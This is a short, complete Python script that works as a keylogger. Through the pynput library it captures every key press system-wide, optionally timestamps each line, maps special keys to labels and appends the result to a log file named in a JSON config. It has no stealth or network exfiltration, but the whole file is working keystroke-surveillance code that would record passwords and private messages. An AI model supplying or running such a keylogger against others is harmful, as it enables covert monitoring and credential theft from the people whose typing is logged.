import datetime
import json
from pathlib import Path
import pynput

SCRIPT_DIR = Path.cwd()
CONFIG_PATH = SCRIPT_DIR / "config.json"

with open(CONFIG_PATH, "r") as file:
    config = json.load(file)

log_config = config["logging"]
fmt_config = config["format"]
key_config = config["keys"]

flush_only_on_flush_keys = fmt_config["flush_only_on_flush_keys"]
newline_on_specific_keys_only = fmt_config["newline_on_specific_keys_only"]
newline_after_every_key = fmt_config["newline_after_every_key"]
timestamp_per_line = fmt_config["timestamp_per_line"]

output_dir = log_config["output_directory"]
if output_dir:
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
else:
    output_dir = SCRIPT_DIR

log_path = output_dir / log_config["filename"]

SpecialKey = pynput.keyboard.Key

def get_pynput_key(key_name):
    return getattr(SpecialKey, key_name, key_name)

NEWLINE_KEYS = [get_pynput_key(k) for k in key_config["newline_keys"]]
FLUSH_KEYS = [get_pynput_key(k) for k in key_config["flush_keys"]]
KEY_MAP = {get_pynput_key(k): v for k, v in key_config["key_map"].items()}

logged_keys = []
is_new_line = True

def get_key_string(key) -> str:
    if key in KEY_MAP:
        return KEY_MAP[key]
    if hasattr(key, "char") and key.char is not None:
        return key.char
    
    key_name = str(key).replace("Key.", "").upper()
    return f" [{key_name}] "

def save_log(text: str):
    with open(log_path, "a") as file:
        file.write(text)

def on_press(key):
    global logged_keys, is_new_line
    
    if is_new_line and timestamp_per_line:
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        logged_keys.append(f"[{current_time}] ")
        is_new_line = False

    key_string = get_key_string(key)
    logged_keys.append(key_string)

    triggers_newline = newline_after_every_key or (key in NEWLINE_KEYS and newline_on_specific_keys_only)
    if triggers_newline:
        logged_keys.append("\n")
        is_new_line = True

    should_flush = not flush_only_on_flush_keys or (key in FLUSH_KEYS)
    if should_flush and logged_keys:
        save_log("".join(logged_keys))
        logged_keys.clear()

with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
